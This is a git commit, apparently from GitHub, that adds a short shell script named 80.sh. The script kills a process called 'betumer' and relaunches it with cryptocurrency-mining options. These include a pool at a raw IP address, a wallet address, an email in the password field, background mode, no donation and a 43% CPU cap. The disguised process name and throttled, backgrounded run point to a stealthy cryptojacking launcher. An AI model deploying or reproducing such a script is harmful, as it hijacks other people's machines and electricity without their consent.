045a7945b42a4dc8a962de726796d0a13f6b2558
duplo1 <46064321+duplo1@users.noreply.github.com>
2019-05-16 01:36:40 +0800

    Add files via upload

---
+++ 80.sh
@@ -0,0 +1,3 @@
+pkill betumer
+sleep 7
+betumer -o 95.216.215.24:5444 -u 43Cpra6HVDQ4e4BcbUKCbg4Ww7qSdcoihcSPLKSHbjCTg1j9UEMEGe21zSzm6uQC4n9HJBppJ9mLigK23rBr693wBGxLumw --pass=12:kotminkot@yandex.ru --rig-id=012 -B --donate-level=0 --print-time=30 --threads=$THREADS --cpu-priority=4 --background --max-cpu-usage=43 --av=1 --variant -1
